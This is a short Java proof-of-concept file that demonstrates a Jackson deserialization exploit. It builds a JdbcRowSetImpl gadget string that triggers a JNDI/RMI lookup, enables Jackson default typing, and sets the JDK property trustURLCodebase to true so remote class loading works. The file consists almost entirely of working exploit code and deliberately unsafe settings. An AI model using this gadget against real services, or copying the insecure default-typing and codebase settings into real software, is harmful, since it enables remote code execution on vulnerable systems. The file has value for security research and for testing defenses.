package com.venscor;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.rowset.JdbcRowSetImpl;

import java.io.IOException;

/**
 * @ClassName JacksonVulDemo
 * @Description TODO
 * @Author wangyu89
 * @Create Time 2019-08-06 17:47
 * @Version 1.0
 */
public class JacksonVulDemo {
    static String exp = "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"rmi://localhost/RemoteBean\", \"autoCommit\":true}]";

    public static void main(String[] args) throws IOException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true"); // 高版本jdk对jdni注入有限制，jdk8u122及以上
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        objectMapper.readValue(exp, Object.class); //只能是object,垃圾


    }
}
